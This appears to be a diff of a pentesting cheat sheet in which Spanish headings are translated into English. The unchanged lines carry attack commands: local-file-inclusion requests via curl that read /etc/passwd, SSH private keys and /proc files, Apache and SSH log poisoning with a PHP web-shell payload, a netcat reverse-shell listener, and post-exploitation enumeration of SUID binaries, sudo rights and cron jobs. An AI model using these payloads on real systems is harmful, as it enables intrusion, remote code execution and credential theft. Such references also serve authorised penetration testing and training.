@@ -188,7 +188,7 @@ dig @IP dominio axfr
 
 # Web
 
-## Enumeracion
+## Enumeration
 ### Directory Listing & subdomain discovering
 
 #### Wfuzz
@@ -232,11 +232,11 @@ php://filter/convert.base64-encode/resource=nombre_archivo.php
 ```
 ### Archivos interesantes que leer
 
-Usuarios del sistema
+System users
 ```
 curl -s 'http://domino/archivo.php?file=/etc/passwd'
 ```
-Grupos a los que pertenecen los usuarios
+Groups of the users
 ```
 curl -s 'http://domino/archivo.php?file=/etc/group'
 ```
@@ -244,15 +244,15 @@ SSH private key
 ```
 curl -s 'http://domino/archivo.php?file=/home/usuario/.ssh/id_rsa'
 ```
-Servicios y programas activos/corriendo en el sistema
+Software active in the machine
 ```
 curl -s 'http://domino/archivo.php?file=/proc/sched_debug'
 ```
-IP de la máquina
+IP of the machine
 ```
 curl -s 'http://domino/archivo.php?file=/proc/net/fib_trie'
 ```
-Puertos abiertos internos
+Open ports inside the machine
 ```
 for port in $(curl -s 'http://dominio/archivo.php?post=/proc/net/tcp' | awk '{print $2}' | grep -v "local_address" | awk '{print $2}' FS=":" | sort -u); do echo "Puerto --> $(echo "ibase=16; $port" | bc)"; done
 ```
@@ -261,7 +261,7 @@ for port in $(curl -s 'http://dominio/archivo.php?post=/proc/net/tcp' | awk '{pr
 
 #### Apache Logs Poisoning
 
-Añadir en el User Agent
+Add in User Agent
 ```
 <?php system($_GET['cmd']); ?>
 ```
@@ -274,7 +274,7 @@ RCE
 ```
 #### SSH Log Poisoning
 
-Hacer petición al SSH
+SSH payload injection
 ```
 ssh '<?php system($_GET['cmd']); ?>'@IP
 ```
@@ -444,23 +444,23 @@ Shell chetada
 rlwrap nc -lvnp PORT
 ```
 
-## PostExplotacion
+## Post-Explotation
 
-Crear un HTTP server
+Create an HTTP Server
 
 ```
 python3 -m http.server PORT
 ```
-Permisos SUID
+SUID perms
 ```
 find / -user root -perm /4000 2>/dev/null
 ```
-Ejecutar como root
+Run as root
 ```
 sudo -l
 ```
 
-Tareas programadas
+Schedulled tasks
 
 ```
 cat /etc/crontab
